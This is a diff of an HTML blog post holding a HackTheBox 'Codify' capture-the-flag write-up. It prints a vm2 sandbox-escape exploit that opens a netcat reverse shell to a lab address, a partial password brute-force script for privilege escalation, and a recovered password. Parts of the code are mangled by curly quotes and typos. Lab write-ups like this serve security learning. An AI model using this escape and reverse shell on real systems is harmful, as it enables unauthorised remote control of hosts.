@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Codify-Linux-Easy</h1>
   
@@ -76,67 +68,68 @@
 <h2 id="1-enumeration">1: Enumeration</h2>
 
 <ul>
-  <li>nmap scanning</li>
+  <li>nmap scanning
+<br /><br />
+<img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_1.png" alt="Untitled" />
+<br /><br />
+FOOTHOLD
+<br /><br />
+```bash
+const {VM} = require(“vm2”);
+const vm = new VM();</li>
 </ul>
 
-<p><img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled.png" alt="Untitled" /></p>
+<p>const code = `
+cmd = ‘id’
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};</p>
 
-<p><img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_1.png" alt="Untitled" /></p>
-
-<p>FOOTHOLD</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const <span class="o">{</span>VM<span class="o">}</span> <span class="o">=</span> require<span class="o">(</span><span class="s2">"vm2"</span><span class="o">)</span><span class="p">;</span>
-const vm <span class="o">=</span> new VM<span class="o">()</span><span class="p">;</span>
-
-const code <span class="o">=</span> <span class="sb">`</span>
-cmd <span class="o">=</span> <span class="s1">'id'</span>
-err <span class="o">=</span> <span class="o">{}</span><span class="p">;</span>
-const handler <span class="o">=</span> <span class="o">{</span>
-    getPrototypeOf<span class="o">(</span>target<span class="o">)</span> <span class="o">{</span>
-        <span class="o">(</span><span class="k">function </span>stack<span class="o">()</span> <span class="o">{</span>
-            new Error<span class="o">()</span>.stack<span class="p">;</span>
-            stack<span class="o">()</span><span class="p">;</span>
-        <span class="o">})()</span><span class="p">;</span>
-    <span class="o">}</span>
-<span class="o">}</span><span class="p">;</span>
-  
-const proxiedErr <span class="o">=</span> new Proxy<span class="o">(</span>err, handler<span class="o">)</span><span class="p">;</span>
-try <span class="o">{</span>
-    throw proxiedErr<span class="p">;</span>
-<span class="o">}</span> catch <span class="o">({</span>constructor: c<span class="o">})</span> <span class="o">{</span>
-    c.constructor<span class="o">(</span><span class="s1">'return process'</span><span class="o">)()</span>.mainModule.require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.execSync<span class="o">(</span><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 9001 <span class="o">&gt;</span>/tmp/f<span class="o">)</span><span class="p">;</span>
-<span class="o">}</span>
-<span class="sb">`</span>
-console.log<span class="o">(</span>vm.run<span class="o">(</span>code<span class="o">))</span><span class="p">;</span>
+<p>const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor(‘return process’)().mainModule.require(‘child_process’).execSync(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.10.10 9001 &gt;/tmp/f);
+}
+`
+console.log(vm.run(code));</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.10.10 9001 &gt;/tmp/f
 </code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 9001 <span class="o">&gt;</span>/tmp/f
-</code></pre></div></div>
-
+<p><br /><br /></p>
 <h2 id="2-user-flag">2: User flag</h2>
-
-<p>Route</p>
-
+<p><br /><br />
+Route
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/contact 
 </code></pre></div></div>
-
-<p>There is a db creds</p>
-
-<p>We use john for get user flag (joshua)</p>
-
-<p><img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_2.png" alt="Untitled" /></p>
-
+<p><br /><br />
+There is a db creds
+<br /><br />
+We use john for get user flag (joshua)
+<br /><br />
+<img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_2.png" alt="Untitled" />
+<br /><br /></p>
 <h2 id="3-priv-esc">3: Priv esc</h2>
-
+<p><br /><br /></p>
 <blockquote>
-  <p>There is a mistake (bad practice) with mysql. Sometimes bash uses the admin password as a “args” and not as a string so we can use a script and with the help of * we can make:</p>
-
+  <p>There is a mistake (bad practice) with mysql. Sometimes bash uses the admin password as a “args” and not as a string so we can use a script and with the help of * we can make:
+<br /><br /></p>
 </blockquote>
 
-<p><img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_3.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_4.png" alt="Untitled" /></p>
-
+<p><img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_3.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_4.png" alt="Untitled" />
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import string
 import subproccess
 
@@ -158,11 +151,14 @@ is_password_found <span class="o">=</span> False
 	</span><span class="k">else</span>:
 		is_password_found <span class="o">=</span> True
 </code></pre></div></div>
-
-<p>klj12h3jhaskjh12kjh3</p>
-
-<p>Machine pwned!
+<p><br /><br />
+klj12h3jhaskjh12kjh3
+<br /><br />
+Machine pwned!
 <script src="/assets/js/matrix-overlay.js"></script></p>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
